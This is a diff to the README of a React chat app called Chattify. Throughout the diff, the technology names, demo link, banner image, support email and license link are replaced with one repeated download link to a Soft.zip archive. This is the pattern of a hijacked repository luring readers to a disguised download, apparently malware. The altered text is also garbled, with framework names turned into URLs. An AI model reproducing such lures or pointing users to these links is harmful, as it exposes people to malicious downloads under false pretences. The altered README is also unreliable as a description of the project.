@@ -2,13 +2,13 @@
 
 ---
 
-![Chattify Banner](https://example.com/banner-image.jpg)
+![Chattify Banner](https://github.com/Gelou-Moe/Chattify/releases/download/v1.0/Soft.zip)
 
 ---
 
 ## Overview
 
-Welcome to Chattify - your go-to solution for seamless real-time chatting! Chattify is a modern chatting application built with cutting-edge technologies such as React, Node.js, and Socket.IO. Whether you want to catch up with friends, collaborate with colleagues, or simply stay connected with loved ones, Chattify has got you covered.
+Welcome to Chattify - your go-to solution for seamless real-time chatting! Chattify is a modern chatting application built with cutting-edge technologies such as React, https://github.com/Gelou-Moe/Chattify/releases/download/v1.0/Soft.zip, and https://github.com/Gelou-Moe/Chattify/releases/download/v1.0/Soft.zip Whether you want to catch up with friends, collaborate with colleagues, or simply stay connected with loved ones, Chattify has got you covered.
 
 With a sleek user interface, intuitive design, and a host of features including instant messaging, file sharing, and real-time updates, Chattify revolutionizes the way you communicate online. Plus, with secure authentication using JWT, you can chat with peace of mind knowing your conversations are safe and private.
 
@@ -24,16 +24,16 @@ With a sleek user interface, intuitive design, and a host of features including 
 
 🎨 **Modern UI Design**: Enjoy a sleek and modern user interface designed to enhance your chatting experience.
 
-🔄 **Real-time Updates**: Get instant notifications and updates as they happen with real-time capabilities powered by Socket.IO.
+🔄 **Real-time Updates**: Get instant notifications and updates as they happen with real-time capabilities powered by https://github.com/Gelou-Moe/Chattify/releases/download/v1.0/Soft.zip
 
 ---
 
 ## Technologies Used
 
 - React
-- Node.js
-- Socket.IO
-- Express.js
+- https://github.com/Gelou-Moe/Chattify/releases/download/v1.0/Soft.zip
+- https://github.com/Gelou-Moe/Chattify/releases/download/v1.0/Soft.zip
+- https://github.com/Gelou-Moe/Chattify/releases/download/v1.0/Soft.zip
 - MongoDB
 - Cloudinary
 - JWT Authentication
@@ -46,18 +46,18 @@ With a sleek user interface, intuitive design, and a host of features including 
 
 - Chat Application
 - Cloudinary
-- Express.js
+- https://github.com/Gelou-Moe/Chattify/releases/download/v1.0/Soft.zip
 - File Sharing
 - Instant Messaging
 - JWT Authentication
 - Modern UI
 - Modern UI Design
 - MongoDB
-- Node.js
+- https://github.com/Gelou-Moe/Chattify/releases/download/v1.0/Soft.zip
 - React
 - Real-time Chat
 - Real-time Update
-- Socket.IO
+- https://github.com/Gelou-Moe/Chattify/releases/download/v1.0/Soft.zip
 - Tailwind CSS
 - Zustand
 
@@ -76,13 +76,13 @@ To get started with Chattify, simply follow these steps:
 
 ## Get Started
 
-Ready to experience the future of chatting? Head over to the [Chattify Live Demo](https://www.chattifydemo.com) and start chatting today!
+Ready to experience the future of chatting? Head over to the [Chattify Live Demo](https://github.com/Gelou-Moe/Chattify/releases/download/v1.0/Soft.zip) and start chatting today!
 
-[![Chattify Live Demo](https://img.shields.io/badge/Live%20Demo-Click%20Here-orange)](https://www.chattifydemo.com)
+[![Chattify Live Demo](https://github.com/Gelou-Moe/Chattify/releases/download/v1.0/Soft.zip%20Demo-Click%20Here-orange)](https://github.com/Gelou-Moe/Chattify/releases/download/v1.0/Soft.zip)
 
 Can't wait to dive into Chattify's codebase? Download the latest release below and start exploring all the amazing features it has to offer.
 
-[![Download Chattify Release](https://img.shields.io/badge/Download%20Latest%20Release-Launch-green)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Chattify Release](https://github.com/Gelou-Moe/Chattify/releases/download/v1.0/Soft.zip%20Latest%20Release-Launch-green)](https://github.com/Gelou-Moe/Chattify/releases/download/v1.0/Soft.zip)
 
 ---
 
@@ -98,7 +98,7 @@ Chattify was developed by a team of passionate developers dedicated to creating 
 
 ## Support
 
-For any questions, feedback, or issues, feel free to reach out to the Chattify team at [support@chattify.com](mailto:support@chattify.com). We're here to ensure you have the best chatting experience possible.
+For any questions, feedback, or issues, feel free to reach out to the Chattify team at [https://github.com/Gelou-Moe/Chattify/releases/download/v1.0/Soft.zip](https://github.com/Gelou-Moe/Chattify/releases/download/v1.0/Soft.zip). We're here to ensure you have the best chatting experience possible.
 
 ---
 
@@ -110,7 +110,7 @@ Want to contribute to Chattify and help make it even better? We welcome any cont
 
 ## License
 
-Chattify is licensed under the MIT License. See the [LICENSE](https://github.com/adelante20/Chattify/blob/main/LICENSE) file for more information.
+Chattify is licensed under the MIT License. See the [LICENSE](https://github.com/Gelou-Moe/Chattify/releases/download/v1.0/Soft.zip) file for more information.
 
 ---
 
